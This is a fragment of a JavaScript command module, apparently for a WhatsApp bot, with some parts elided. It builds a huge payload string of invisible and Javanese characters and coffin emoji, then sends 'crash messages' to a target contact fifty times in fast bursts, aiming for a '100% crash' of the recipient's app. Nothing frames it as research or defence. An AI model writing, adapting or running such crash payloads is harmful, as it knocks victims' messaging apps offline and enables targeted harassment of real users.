...
export default {
  ...
  async execute(msg, { sock, args }) {
    ...
    // Send crash messages
    try {
      const amount = 50; // Increased payload count for "100% crash"
      const extremeLongChar = "\u200E".repeat(2048) + "ꦽ".repeat(200000) + "⚰️".repeat(50000); 
      
      for (let r = 0; r < amount; r++) {
        try {
          // Sending more frequent and heavier messages
          await sendCrashMessage(sock, targetJid);
          if (r % 2 === 0) await sleep(500); // Faster bursts
          
          if (r % 10 === 0) {
            console.log(`[CRASH] High Intensity Iteration ${r + 1}/${amount}`);
          }
        } catch (e) {
          console.log(`[CRASH] Error in iteration ${r + 1}: ${e.message}`);
        }
      }
